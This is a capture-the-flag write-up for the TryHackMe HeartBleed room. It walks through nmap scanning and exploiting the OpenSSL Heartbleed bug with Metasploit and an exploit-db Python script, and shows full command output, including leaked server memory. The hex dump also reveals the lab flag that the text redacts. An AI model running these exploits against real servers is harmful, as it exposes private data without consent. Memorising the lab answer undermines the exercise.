# HeartBleed

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Linux
Subscription type: Premium
Description: SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?
```
Room link: [https://tryhackme.com/r/room/heartbleed](https://tryhackme.com/r/room/heartbleed)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ nmap -v -sV -sC 34.242.247.21 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 13:57 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating Ping Scan at 13:57
Scanning 34.242.247.21 [2 ports]
Completed Ping Scan at 13:57, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:57
Completed Parallel DNS resolution of 1 host. at 13:57, 0.03s elapsed
Initiating Connect Scan at 13:57
Scanning ec2-34-242-247-21.eu-west-1.compute.amazonaws.com (34.242.247.21) [1000 ports]
Discovered open port 443/tcp on 34.242.247.21
Discovered open port 22/tcp on 34.242.247.21
Discovered open port 111/tcp on 34.242.247.21
Completed Connect Scan at 13:57, 1.61s elapsed (1000 total ports)
Initiating Service scan at 13:57
Scanning 3 services on ec2-34-242-247-21.eu-west-1.compute.amazonaws.com (34.242.247.21)
Completed Service scan at 13:57, 12.26s elapsed (3 services on 1 host)
NSE: Script scanning 34.242.247.21.
Initiating NSE at 13:57
Completed NSE at 13:57, 1.92s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.39s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Nmap scan report for ec2-34-242-247-21.eu-west-1.compute.amazonaws.com (34.242.247.21)
Host is up (0.039s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT    STATE    SERVICE      VERSION
22/tcp  open     ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 53:83:70:66:fe:63:1a:e4:df:0a:ac:9b:6d:57:77:95 (RSA)
|   256 a2:54:e9:94:f0:35:e4:cf:8f:b7:29:4f:74:ee:f3:e6 (ECDSA)
|_  256 4a:9e:d8:b1:50:11:c0:71:ee:cf:d0:7e:d5:c4:20:2d (ED25519)
25/tcp  filtered smtp
111/tcp open     rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35245/tcp6  status
|   100024  1          36507/tcp   status
|   100024  1          40423/udp   status
|_  100024  1          60498/udp6  status
135/tcp filtered msrpc
139/tcp filtered netbios-ssn
443/tcp open     ssl/http     nginx 1.15.7
|_http-title: What are you looking for?
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-16T10:41:14
| Not valid after:  2020-02-16T10:41:14
| MD5:   4b3a:f45e:a597:6f3f:06f6:e9d2:518a:c1c4
|_SHA-1: 01e8:fa58:e5a0:5102:d9e3:2ee3:8212:9d28:3934:4d57
|_http-server-header: nginx/1.15.7
| tls-nextprotoneg: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_ssl-date: TLS randomness does not represent time
445/tcp filtered microsoft-ds

NSE: Script Post-scanning.
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Initiating NSE at 13:57
Completed NSE at 13:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
```
We have three services running:
- OpenSSH 7.4 on port 22
- rpcbind 2-4 on port 111
- nginx 1.15.7 on port 443

### Verify the vulnerability with nmap

We can verify the presence of the vulnerabilty with nmap's vuln scripts
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ nmap -v -p 443 --script vuln 34.242.247.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 14:02 CEST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:02
NSE Timing: About 40.00% done; ETC: 14:04 (0:00:48 remaining)
Completed NSE at 14:03, 34.81s elapsed
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 14:03
Scanning 34.242.247.21 [2 ports]
Completed Ping Scan at 14:03, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:03
Completed Parallel DNS resolution of 1 host. at 14:03, 0.03s elapsed
Initiating Connect Scan at 14:03
Scanning ec2-34-242-247-21.eu-west-1.compute.amazonaws.com (34.242.247.21) [1 port]
Discovered open port 443/tcp on 34.242.247.21
Completed Connect Scan at 14:03, 0.04s elapsed (1 total ports)
NSE: Script scanning 34.242.247.21.
Initiating NSE at 14:03
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 14:07, 230.79s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.01s elapsed
Nmap scan report for ec2-34-242-247-21.eu-west-1.compute.amazonaws.com (34.242.247.21)
Host is up (0.037s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_http-csrf: Couldn't find any CSRF vulnerabilities.

NSE: Script Post-scanning.
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 266.11 seconds
```

### Exploit the vulnerability with metasploit

We can exploit the vulnerability with [Metasploit](https://www.metasploit.com/)
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ msfconsole                                                                                            
Metasploit tip: Display the Framework log using the log command, learn 
more with help log
                                                  
     ,           ,
    /             \                                                                                                                                                                       
   ((__---,,,---__))                                                                                                                                                                      
      (_) O O (_)_________                                                                                                                                                                
         \ _ /            |\                                                                                                                                                              
          o_o \   M S F   | \                                                                                                                                                             
               \   _____  |  *                                                                                                                                                            
                |||   WW|||                                                                                                                                                               
                |||     |||                                                                                                                                                               
                                                                                                                                                                                          

       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search heartbleed

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal  Yes    Elasticsearch Memory Disclosure
   1  auxiliary/server/openssl_heartbeat_client_memory        2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   2  auxiliary/scanner/ssl/openssl_heartbleed                2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/ssl/openssl_heartbleed

msf6 > use 2
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 34.242.247.21
RHOSTS => 34.242.247.21
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run

[*] 34.242.247.21:443     - Leaking heartbeat response #1
[*] 34.242.247.21:443     - Sending Client Hello...
[*] 34.242.247.21:443     - SSL record #1:
[*] 34.242.247.21:443     -     Type:    22
[*] 34.242.247.21:443     -     Version: 0x0301
[*] 34.242.247.21:443     -     Length:  86
[*] 34.242.247.21:443     -     Handshake #1:
[*] 34.242.247.21:443     -             Length: 82
[*] 34.242.247.21:443     -             Type:   Server Hello (2)
[*] 34.242.247.21:443     -             Server Hello Version:           0x0301
[*] 34.242.247.21:443     -             Server Hello random data:       31e96a9dabf8d6743ff23ad76d3b262891306620cc63365d0d4b98735343cad1
[*] 34.242.247.21:443     -             Server Hello Session ID length: 32
[*] 34.242.247.21:443     -             Server Hello Session ID:        14e2ea2388b6bb76cf210b83e84431cefeebfb0af846a54e8b014e827107b3b3
[*] 34.242.247.21:443     - SSL record #2:
[*] 34.242.247.21:443     -     Type:    22
[*] 34.242.247.21:443     -     Version: 0x0301
[*] 34.242.247.21:443     -     Length:  951
[*] 34.242.247.21:443     -     Handshake #1:
[*] 34.242.247.21:443     -             Length: 947
[*] 34.242.247.21:443     -             Type:   Certificate Data (11)
[*] 34.242.247.21:443     -             Certificates length: 944
[*] 34.242.247.21:443     -             Data length: 947
[*] 34.242.247.21:443     -             Certificate #1:
[*] 34.242.247.21:443     -                     Certificate #1: Length: 941
[*] 34.242.247.21:443     -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, issuer=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, serial=#<OpenSSL::BN:0x00007f512556f270>, not_before=2019-02-16 10:41:14 UTC, not_after=2020-02-16 10:41:14 UTC>
[*] 34.242.247.21:443     - SSL record #3:
[*] 34.242.247.21:443     -     Type:    22
[*] 34.242.247.21:443     -     Version: 0x0301
[*] 34.242.247.21:443     -     Length:  331
[*] 34.242.247.21:443     -     Handshake #1:
[*] 34.242.247.21:443     -             Length: 327
[*] 34.242.247.21:443     -             Type:   Server Key Exchange (12)
[*] 34.242.247.21:443     - SSL record #4:
[*] 34.242.247.21:443     -     Type:    22
[*] 34.242.247.21:443     -     Version: 0x0301
[*] 34.242.247.21:443     -     Length:  4
[*] 34.242.247.21:443     -     Handshake #1:
[*] 34.242.247.21:443     -             Length: 0
[*] 34.242.247.21:443     -             Type:   Server Hello Done (14)
[*] 34.242.247.21:443     - Sending Heartbeat...
[*] 34.242.247.21:443     - Heartbeat response, 43435 bytes
[+] 34.242.247.21:443     - Heartbeat response with leak, 43435 bytes
[*] 34.242.247.21:443     - Printable info leaked:
......f......w....8....:.y.O.c;.B@}.....f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{<REDACTED>}q1.......F....8t....+............-.....3.&.$... .j.M..c../R.r?..8: ..].....x...O............?...............................................................age">.    <traits><string>body</string><string>clientId</string>.    <string>correlationId</string><string>destination</string>.    <string>headers</string><string>messageId</string><string>.    operation</string><string>timestamp</string><string>timeToLive.    </string></traits><object><traits /></object><null /><string />.    <string /><object><traits><string>DSId</string><string>.    DSMessagingVersion</string></traits><string>nil</string>.    <int>1</int></object><string>&x3;</string><int>5</int>.    <int>0</int><int>0</int></object></body></amfx>.m.b.x......?.`.^..&..................................................................................................................................... repeated 15032 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.......}.............A.....O..N../.h...t..u..{.......+W...mt..FT.s\)>GxH.h.+..X.R.[>U.o..$i...0....l./.....A....=..<.....E...W..u.`.fG..D$Y.+....MX.....;.!?k....!.(...-......VY........H.......e.......$..u.E...t..*.^s-.......6..~.9.i......X,6Y....5.'....h....?.w.R-....\`.JdP........UN&...\G.`2}v.;C.[.`..N.:Z..5W.....h$.....).......]..R_.k.S..4...OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C..................................................................................................................................... repeated 215 times .....................................................................................................................................p.......p.......................p................u......H.......................<!DOCTYPE html>.<html>.<head>.<title>What are you looking for?</title>.<style>.    body {.        width: 35em;.        margin: 0 auto;.        font-family: Tahoma, Verdana, Arial, sans-serif;.    }.</style>.</head>.<body>.<h1> Who said static pages aren't fun right? </h1>.<video width="560" height="315" controls>.  <source src="heartbleed-song.mp4" type="video/mp4">.</video>.<p> My friend really like this Heartbleed song - I think you all will like it too </p>..<!-- don't forget to remove secret communication pages -->..</body>.</html>... ............... .......`.......78.69.105.96 - - [14/Sep/2024:12:03:28 +0000] "GET / HTTP/1.0" 200 542 "-" "-"..................................................................................................................................... repeated 2097 times .....................................................................................................................................@..........V...R..u..?.N....n.Kt.G.s..d9...z-.X[&c ..2..E$..:..r....ti^.....!D....r..............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A.3.*.2.H.<o.M.4.R..ri..j. ....;7....:..m.....&.6.H.5h.........r.....a;y...IwnYD...B.'..s.......N..1n..........H..Z..E....Z..w...z..G...-..........H..........~....@.........p.....,E.2}.7z.GS.....)...b.....h."...V..0.y>..''.R..;`.{>..}{...!iF.;..V6...1.j, ....=.....U.2...=........Gm0..z..t..._.bE.q.........._qK.L.T..ty...`..................................................................................................................................... repeated 4137 times .....................................................................................................................................
[*] 34.242.247.21:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > 
```
The flag can be found in the beginning of the leaked memory in the `user_message` parameter
```
<---snip--->
[*] 34.242.247.21:443     - Printable info leaked:
<---snip--->
Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{<REDACTED>}q1.....
<---snip--->
```

### Exploit the vulnerability with a standalone exploit

Alternatively, we can search for a standalone exploit in [exploit-db.com](https://www.exploit-db.com/)
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ searchsploit heartbleed       
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                                     | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                                     | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                                      | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                                        | multiple/remote/32745.py
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's try the last one
```bash                        
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ searchsploit -m 32745     
  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
      URL: https://www.exploit-db.com/exploits/32745
     Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py
    Codes: CVE-2014-0346, OSVDB-105465, CVE-2014-0160
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/HeartBleed/32745.py

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ python 32745.py              
  File "/mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/HeartBleed/32745.py", line 48
    print '  %04x: %-48s %s' % (b, hxdat, pdat)
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ python2 32745.py
Usage: 32745.py server [options]

Test for SSL heartbeat vulnerability (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
└─$ python2 32745.py 34.242.247.21
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 951
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 6E 67 74 68  ....#.......ngth
  00e0: 3A 20 37 35 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79  : 75..Content-Ty
  00f0: 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F  pe: application/
  0100: 78 2D 77 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E  x-www-form-urlen
  0110: 63 6F 64 65 64 0D 0A 0D 0A 75 73 65 72 5F 6E 61  coded....user_na
  0120: 6D 65 3D 68 61 63 6B 65 72 31 30 31 26 75 73 65  me=hacker101&use
  0130: 72 5F 65 6D 61 69 6C 3D 68 61 78 6F 72 40 68 61  r_email=haxor@ha
  0140: 78 6F 72 2E 63 6F 6D 26 75 73 65 72 5F 6D 65 73  xor.com&user_mes
  0150: 73 61 67 65 3D 54 48 4D 7B 73 53 6C 2D 49 73 2D  sage=THM{<REDACT
  0160: 42 61 44 7D FD C1 8D 52 38 24 44 2F 1D 38 E9 17  ED>}...R8$D/.8..
  0170: CE 3A FD 63 00 00 00 00 00 00 00 00 00 00 00 00  .:.c............
  0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
<---snip--->
```
And there we have the flag again.

For additional information, please see the references below.

## References

- [Diagnosis of the OpenSSL Heartbleed Bug](https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html)
- [exploit-db.com](https://www.exploit-db.com/)
- [Heartbleed - Wikipedia](https://en.wikipedia.org/wiki/Heartbleed)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [The Heartbleed Bug](https://heartbleed.com/)
